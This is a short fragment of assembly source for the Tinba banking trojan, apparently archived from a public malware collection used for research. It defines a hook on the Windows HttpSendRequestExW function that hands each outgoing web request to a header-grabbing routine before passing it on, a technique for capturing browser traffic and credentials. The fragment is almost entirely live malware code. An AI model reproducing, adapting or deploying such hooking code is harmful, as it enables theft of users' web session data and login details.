; ------------------------------------------------------------
; name      Tinba
; type      trojan
; cve       —
; year      unknown
; os        Windows
; authors   unknown
; source    RamadhanAmizudin/malware
; archived  RamadhanAmizudin, krisyotam (2026)
; notes     —
; ------------------------------------------------------------

.code

;; ==================================================================================================== ;;
;; hHttpSendRequestExW is a HttpSendRequestExW handler procedure                                        ;;
;; ==================================================================================================== ;;
hHttpSendRequestExW proc uses ebx p1, p2, p3, p4, p5 : dword

	GetBaseDelta ebx

	invokx  &GrabIEHeaders[ebx], p1, 0, 0

	invokx  _HttpSendRequestExW[ebx], p1, p2, p3, p4, p5

	ret
hHttpSendRequestExW endp

